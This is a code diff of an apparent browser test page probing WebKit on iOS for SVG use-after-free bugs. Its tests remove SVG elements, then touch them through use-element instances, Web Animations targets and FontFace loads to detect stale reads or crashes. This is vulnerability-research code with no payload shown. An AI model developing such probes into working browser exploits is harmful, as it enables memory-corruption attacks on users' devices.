-            const ro=new ResizeObserver(()=>{
-                phase++;
-                if(phase>1){ro.disconnect();safeResolve();return;}
+        // Can we call getBBox on targetElement after sym freed?
+        let postTargetBB=null;
+        if(postTarget){
+            try{postTargetBB=postTarget.getBBox?.().width;}catch(ex){reads.targetBB_crash=ex.message.slice(0,40);crash++;}
+        }
+        reads.postTargetBB=postTargetBB;
 
-                const seq={};
+        // Does useEl still have accessible shadow children?
+        let postShadowChild=null;
+        try{if(shadowRoot)postShadowChild=shadowRoot.firstChild?.tagName;}catch(ex){crash++;}
+        reads.postShadowChild=postShadowChild;
 
-                // a. before remove
-                try{seq.a=r.getBBox().width;}catch(e){seq.a='ERR';}
+        // Read use element's own geometry (sym was its target — now freed)
+        let useW=null;
+        try{useW=useEl.getBBox?.().width;}catch(ex){reads.use_crash=ex.message.slice(0,40);crash++;}
+        reads.useW=useW;
 
-                // b. after remove
-                try{r.remove();}catch(e){}
-                try{seq.b=r.getBBox().width;}catch(e){seq.b='ERR';}
+        // correspondingElement on instance root
+        let corrEl=null,corrTag='?';
+        try{if(instanceRoot){corrEl=instanceRoot.correspondingElement;corrTag=corrEl?.tagName||'null';}}catch(ex){crash++;}
+        reads.corrTag=corrTag;
 
-                // c. mutate width while removed (does getBBox update?)
-                r.setAttribute('width','999');
-                try{seq.c=r.getBBox().width;}catch(e){seq.c='ERR';}
+        // Is there stale data?
+        const isStale=(postTargetTag!=='null'&&postTargetTag!=='?')||
+                      (postTargetBB&&postTargetBB!==0)||
+                      (useW&&useW!==0)||crash>0;
 
-                // d. re-insert into DOM → new layout
-                livesvg.appendChild(r);
-                try{seq.d=r.getBBox().width;}catch(e){seq.d='ERR';}
-
-                // e. remove again (second remove)
-                r.remove();
-                try{seq.e=r.getBBox().width;}catch(e){seq.e='ERR';}
-
-                // f. re-mutate width while removed again
-                r.setAttribute('width','42');
-                try{seq.f=r.getBBox().width;}catch(e){seq.f='ERR';}
-
-                seqResults.push(seq);
-                const interesting=seq.b!==0||seq.c!==0||seq.e!==0;
-                log(`  t${t}: a=${seq.a} b=${seq.b} c=${seq.c} d=${seq.d} e=${seq.e} f=${seq.f}`,(interesting?'bad':'dim'));
-
-                ro.disconnect();safeResolve();
-            });
-            try{ro.observe(r);}catch(ex){safeResolve();}
-        });
+        if(isStale){
+            stale++;
+            log(`  t${t}: [STALE] postTarget=${postTargetTag} postBB=${postTargetBB} useW=${useW} corr=${corrTag} crash=${reads.target_crash||reads.use_crash||''}`,'bad');
+        }else{
+            normal++;
+            if(t<3)log(`  t${t}: postTarget=${postTargetTag} postBB=${postTargetBB} useW=${useW} shadow=${reads.shadowRoot} corrTag=${corrTag}`,'dim');
+        }
 
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();
     }
 
-    if(seqResults.length>0){
-        const s=seqResults[0];
-        log(`\n[*] SEQ first result: a=${s.a} b=${s.b} c=${s.c} d=${s.d} e=${s.e} f=${s.f}`,'inf');
-        // Interpretation
-        if(s.b===80&&s.c===80)log(`[*] b=c=80: remove+mutate doesn't change — stale RenderObject ptr (H2)`,'bad');
-        if(s.b===80&&s.c===999)log(`[*] b=80 c=999: reads ptr, but ptr is live and updates — H3 (deferred destroy)`,'inf');
-        if(s.b===0&&s.c===0)log(`[*] b=c=0: RO not protecting anything — v15 was JS cache (H1)`,'dim');
-        if(s.e===999)log(`[*] e=999: 2nd remove retains last layout value — JS cache confirmed`,'inf');
-        if(s.e===0)log(`[*] e=0: 2nd remove clears — only first remove has window`,'bad');
+    log(`\n[*] UI: stale=${stale} normal=${normal} crash=${crash}`,(stale>0||crash>0?'bad':'inf'));
+    if(!q)dis(false);
+    return{stale,normal,crash};
+}
+
+// ── WA: Web Animations API ────────────────────────────────────────────────
+async function runWA(q=false){
+    if(!q){dis(true);sep();log('▶ WA: Web Animations API — animation.effect.target ptr after element removed','inf');sep();}
+    log('[*] element.animate() → Animation holds KeyframeEffect with target ptr','inf');
+    log('[*] remove element → call play/pause/reverse/commitStyles/finish on Animation','ok');
+    log('[*] also: getComputedTiming, getKeyframes, updatePlaybackRate after removal','ok');
+    log('[*] also: read animation.currentTime while effect fires on freed element','bad');log('');
+
+    let crash=0,stale=0,normal=0;
+
+    for(let t=0;t<20;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const rect=document.createElementNS(SVG_NS,'rect');
+        rect.setAttribute('x','5');rect.setAttribute('y','5');
+        rect.setAttribute('width','80');rect.setAttribute('height','80');
+        rect.setAttribute('fill','blue');
+        livesvg.appendChild(rect);
+        await raf();
+
+        // Create animation BEFORE removal
+        let anim=null;
+        try{
+            anim=rect.animate(
+                [{width:'80px',fill:'blue'},{width:'20px',fill:'red'}],
+                {duration:500,iterations:Infinity,fill:'forwards'}
+            );
+        }catch(e){}
+
+        if(!anim){
+            normal++;
+            if(t<3)log(`  t${t}: animate() not available`,'dim');
+            continue;
+        }
+
+        await raf(); // let animation start
+
+        // Grab references to effect and target BEFORE removal
+        let effect=null,effectTarget=null;
+        try{effect=anim.effect;}catch(e){}
+        try{effectTarget=effect?.target;}catch(e){}
+
+        const preTag=effectTarget?.tagName||'?';
+        const preTime=anim.currentTime;
+
+        // ── REMOVE THE ELEMENT ──
+        rect.remove();
+        await micro();
+
+        const reads={preTag,preTime};
+
+        // ── OPERATE ON ANIMATION AFTER TARGET FREED ──
+
+        // Read animation state
+        try{reads.postTime=anim.currentTime;}catch(ex){reads.time_crash=ex.message.slice(0,40);crash++;}
+        try{reads.playState=anim.playState;}catch(ex){reads.playState_crash=ex.message.slice(0,40);crash++;}
+        try{reads.ready=!!anim.ready;}catch(ex){}
+
+        // effect.target after removal
+        try{
+            const t2=anim.effect?.target;
+            reads.postTargetTag=t2?.tagName||'null';
+            // If target still accessible, read its state
+            if(t2){
+                try{reads.postTargetBB=t2.getBBox?.().width;}catch(ex){crash++;}
+                try{reads.postTargetParent=t2.parentElement?.tagName||'detached';}catch(ex){}
+            }
+        }catch(ex){reads.target_crash=ex.message.slice(0,40);crash++;}
+
+        // getComputedTiming — accesses animation effect on freed target
+        try{
+            const ct=effect?.getComputedTiming?.();
+            reads.duration=ct?.activeDuration;
+            reads.progress=ct?.progress;
+        }catch(ex){reads.timing_crash=ex.message.slice(0,40);crash++;}
+
+        // getKeyframes — reads keyframe state from freed element context
+        try{
+            const kf=effect?.getKeyframes?.();
+            reads.keyframeCount=kf?.length;
+            reads.kf0Width=kf?.[0]?.width;
+        }catch(ex){reads.kf_crash=ex.message.slice(0,40);crash++;}
+
+        // Mutate animation state — force effect application on freed target
+        try{anim.currentTime=250;}catch(ex){reads.setTime_crash=ex.message.slice(0,40);crash++;}
+        try{anim.pause();}catch(ex){reads.pause_crash=ex.message.slice(0,40);crash++;}
+        try{anim.play();}catch(ex){reads.play_crash=ex.message.slice(0,40);crash++;}
+        try{anim.reverse();}catch(ex){reads.rev_crash=ex.message.slice(0,40);crash++;}
+        try{anim.updatePlaybackRate?.(2);}catch(ex){reads.rate_crash=ex.message.slice(0,40);crash++;}
+
+        // commitStyles — forces style commit to freed element
+        try{anim.commitStyles?.();}catch(ex){reads.commit_crash=ex.message.slice(0,40);crash++;}
+
+        // finish — triggers finish event on freed target
+        try{anim.finish?.();}catch(ex){reads.finish_crash=ex.message.slice(0,40);crash++;}
+
+        // Read animation target's computed style after all mutations
+        try{
+            const tgt=anim.effect?.target;
+            if(tgt)reads.finalWidth=getComputedStyle(tgt).width;
+        }catch(ex){crash++;}
+
+        const isStale=(reads.postTargetTag&&reads.postTargetTag!=='null')||
+                      (reads.postTargetBB&&reads.postTargetBB!==0)||
+                      (reads.finalWidth&&reads.finalWidth!=='')||
+                      crash>0;
+
+        if(isStale){
+            stale++;
+            log(`  t${t}: [STALE/CRASH] tgt=${reads.postTargetTag} tgtBB=${reads.postTargetBB} parent=${reads.postTargetParent} finalW=${reads.finalWidth} progr=${reads.progress} crash=${Object.entries(reads).filter(([k])=>k.includes('crash')&&reads[k]).map(([k,v])=>k+':'+v).join(',')||'none'}`,'bad');
+        }else{
+            normal++;
+            if(t<3)log(`  t${t}: postTag=${reads.postTargetTag} tgtBB=${reads.postTargetBB} state=${reads.playState} dur=${reads.duration} progr=${reads.progress}`,'dim');
+        }
+
+        try{anim.cancel?.();}catch(e){}
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
     }
 
+    log(`\n[*] WA: stale=${stale} normal=${normal} crash=${crash}`,(stale>0||crash>0?'bad':'inf'));
     if(!q)dis(false);
-    return{seqResults};
+    return{stale,normal,crash};
+}
+
+// ── FF: FontFace async load callback ─────────────────────────────────────
+async function runFF(q=false){
+    if(!q){dis(true);sep();log('▶ FF: FontFace async load — font load callback fires after SVG text removed','inf');sep();}
+    log('[*] new FontFace() + add to document.fonts → text uses font → remove text','inf');
+    log('[*] font.loaded promise / document.fonts.ready fires after removal','ok');
+    log('[*] WebKit font load triggers text reflow → freed RenderText ptr?','ok');
+    log('[*] also: FontFaceSet loading event, loadingdone event on removed elem','bad');log('');
+
+    let crash=0,stale=0,normal=0;
+    let fontReady=false;
+
+    // Build a tiny valid WOFF2 font as data URI
+    // Use a real base64-encoded minimal font (SourceSansPro subset or similar)
+    // For testing we'll use a CSS-defined @font-face with a data URI
+    // Minimal valid TTF font (just the required tables) — about 260 bytes
+    // This is a real minimal font that WebKit will try to load
+    const FONT_DATA_URI = 'data:font/woff;base64,d09GRgABAAAAAAZMAA0AAAAACkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAAGMAAAABwAAAAcNnfGVEdERUYAAAXQAAAAHgAAAB4AJwEET1MvMgAAAVgAAABEAAAAYE0XYWBjbWFwAAABsAAAAEQAAAFKAAEAA2N2dCAAAAH0AAAAEAAAABAAAA0KZnBnbQAAAfQAAAANAAAADQAADQpoZWFkAAAA7AAAADYAAAAwMS8zNmhoZWEAAAEkAAAAIAAAACQDuwItaG10eAAAAYwAAAAkAAAAJAAAACRsb2NhAAAB2AAAABQAAAAUAAAAFm1heHAAAAEEAAAAIAAAACAAUQAvbmFtZQAAAkAAAAE5AAABaQAEAABwb3N0AAADeAAAABMAAAISaABkAHByZXAAAALgAAAAGAAAABgABAABAAEAAAAKADAAPgACREZMVAAIbGF0bgAIAAQAAAAAABQAAgAAAAIAAgACAAMAAQABAAQAAAACAAAABAAAAAMAAQADAAIAAA==';
+
+    for(let t=0;t<16;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        // Also remove any previously added font faces to avoid cache
+        await raf();await raf();
+
+        const fontName=`TestFont_${t}_${Date.now()}`;
+
+        // Create SVG text element that will use our custom font
+        const textEl=document.createElementNS(SVG_NS,'text');
+        textEl.setAttribute('x','10');textEl.setAttribute('y','50');
+        textEl.setAttribute('font-family',`'${fontName}', sans-serif`);
+        textEl.setAttribute('font-size','20');
+        textEl.textContent='UAF TEST';
+        livesvg.appendChild(textEl);
+
+        const reads={};
+
+        // Create FontFace — don't add to document yet
+        let face=null;
+        try{
+            face=new FontFace(fontName,FONT_DATA_URI);
+        }catch(ex){
+            reads.face_create_crash=ex.message.slice(0,40);
+            if(t<3)log(`  t${t}: FontFace() failed: ${ex.message}`,'dim');
+            normal++;continue;
+        }
+
+        // Add to document.fonts → triggers async load
+        try{document.fonts.add(face);}catch(ex){reads.add_crash=ex.message.slice(0,40);}
+
+        await raf(); // font load starts
+
+        // ── REMOVE THE TEXT ELEMENT while font is loading ──
+        const capturedText=textEl;
+        textEl.remove();
+
+        // Grab SVGAnimatedLength refs from text element while it's removed
+        let animX=null,animY=null;
+        try{animX=textEl.x;}catch(e){}  // SVGAnimatedLengthList
+        try{animY=textEl.y;}catch(e){}
+
+        // ── WAIT FOR FONT LOAD ──
+        const fontLoadResult=await Promise.race([
+            face.load().then(()=>({loaded:true})).catch(e=>({loadErr:e.message})),
+            new Promise(r=>setTimeout(()=>r({timeout:true}),1000))
+        ]);
+        reads.fontLoad=JSON.stringify(fontLoadResult).slice(0,40);
+
+        if(fontLoadResult.loaded){
+            // Font loaded AFTER text element was removed
+            // WebKit may try to reflow the text — but element is detached
+            await raf(); // let any reflow callbacks fire
+            await micro();
+
+            // Read text element state after font load callback
+            try{reads.postLoadTag=capturedText.tagName;}catch(ex){crash++;reads.tag_crash=ex.message.slice(0,40);}
+            try{reads.postLoadParent=capturedText.parentElement?.tagName||'detached';}catch(ex){}
+            try{reads.postLoadText=capturedText.textContent;}catch(ex){crash++;reads.text_crash=ex.message.slice(0,40);}
+
+            // Try getBBox — text layout with custom font
+            try{reads.postBBox=capturedText.getBBox?.().width;}catch(ex){crash++;reads.bbox_crash=ex.message.slice(0,40);}
+
+            // Try getComputedStyle on removed text after font load
+            try{reads.postCS=getComputedStyle(capturedText).fontFamily;}catch(ex){crash++;reads.cs_crash=ex.message.slice(0,40);}
+
+            // Re-read animated positions
+            try{reads.animXVal=animX?.baseVal?.getItem?.(0)?.value;}catch(ex){crash++;reads.animx_crash=ex.message.slice(0,40);}
+
+            // Try to force font measurement on removed element
+            try{
+                capturedText.setAttribute('font-size','99');
+                reads.postSetAttr=capturedText.getAttribute('font-size');
+                const bb2=capturedText.getBBox?.();
+                reads.postSetBBox=bb2?.width;
+            }catch(ex){crash++;reads.setattr_crash=ex.message.slice(0,40);}
+
+            const isStale=(reads.postBBox&&reads.postBBox!==0)||
+                          (reads.postSetBBox&&reads.postSetBBox!==0)||
+                          (reads.postCS&&reads.postCS!=='')||
+                          crash>0;
+
+            if(isStale){
+                stale++;
+                log(`  t${t}: [STALE] postBBox=${reads.postBBox} postCS=${reads.postCS?.slice(0,20)} postText=${reads.postLoadText?.slice(0,10)} crash=${reads.bbox_crash||reads.cs_crash||''}`,'bad');
+            }else{
+                normal++;
+                if(t<3)log(`  t${t}: font=${fontLoadResult.loaded?'OK':'ERR'} postBBox=${reads.postBBox} cs=${reads.postCS?.slice(0,20)} parent=${reads.postLoadParent}`,'dim');
+            }
+        }else{
+            normal++;
+            if(t<3)log(`  t${t}: fontLoad=${reads.fontLoad} (font didn't load)`,'dim');
+        }
+
+        // Cleanup
+        try{document.fonts.delete(face);}catch(e){}
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    log(`\n[*] FF: stale=${stale} normal=${normal} crash=${crash}`,(stale>0||crash>0?'bad':'inf'));
+    if(!q)dis(false);
+    return{stale,normal,crash};
 }
 
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG v17 — isolating RO getBBox primitive: cache vs stale ptr vs deferred','inf');sep();
-    log('[*] v15: getBBox()=80 inside RO callback after remove — 20/20','ok');
-    log('[*] question: is 80 a JS cache, a stale freed ptr (UAF), or deferred destroy?','ok');
-    log('[*] DEL test (resize to 123 then remove) is the decisive test','bad');log('');
+    log('▶ SVG UAF v18 — ultimate async: AL + UI + WA + FF','inf');sep();
+    log('[*] v17 closed: no JS cache, no RO window, v15 was false positive','ok');
+    log('[*] v18 targets C++ objects that hold element ptrs beyond element lifetime','ok');
+    log('[*] SVGAnimatedLength.m_contextElement, instance nodes, Animation effect.target, font reflow','bad');log('');
+
     const R={};
     for(const[lbl,fn]of[
-        ['CAC_baseline_cache',runCAC],
-        ['DEL_delta_resize',runDEL],
-        ['DEF_timing_window',runDEF],
-        ['ROI_isolated_repro',runROI],
-        ['SEQ_lifecycle_trace',runSEQ],
+        ['AL_animated_length',runAL],
+        ['UI_use_instance',runUI],
+        ['WA_web_animations',runWA],
+        ['FF_font_face',runFF],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
         try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v17 — interpretation key','inf');sep();
-    log('[*] CAC syncW≠0 → JS cache exists (getBBox benign outside RO too)','dim');
-    log('[*] CAC syncW=0 → v15 80 is RO-specific (either UAF or deferred)','inf');
-    log('[*] DEL got80   → STALE OLD PTR: pre-resize geometry = true UAF read','bad');
-    log('[*] DEL got123  → live ptr or JS cache (deferred or benign)','inf');
-    log('[*] DEF window extends past sync → RO delivery protects RenderObject','inf');
-    log('[*] SEQ b=c=80  → stale ptr (H2); b=80,c=999 → live deferred (H3)','inf');
+
+    sep();log('▶ SUMMARY v18','inf');sep();
+    log('[*] AL stale → SVGAnimatedLength holds freed element ptr = UAF read/write','inf');
+    log('[*] UI stale → use instance tree exposes freed symbol children','inf');
+    log('[*] WA stale → Web Animations effect.target survives removal = UAF','inf');
+    log('[*] FF stale → font load callback triggers freed text RenderObject','inf');
+
+    let anyHit=false;
     for(const[lbl,r]of Object.entries(R)){
-        if(r)log(`  ${lbl}: ${JSON.stringify(r).slice(0,120)}`,'dim');
+        if(r){
+            const h=(r.stale||0)+(r.crash||0);
+            if(h>0)anyHit=true;
+            log(`  ${lbl}: stale=${r.stale} crash=${r.crash} normal=${r.normal}`,(h>0?'bad':'dim'));
+        }
     }
+
+    if(anyHit)log(`\n[!!] HIT DETECTED — genuine C++ lifetime UAF found on iOS 26.5.2`,'bad');
+    else log(`\n[*] No hits this run — see per-test logs for details`,'dim');
+
     sep();dis(false);
 }
 </script>
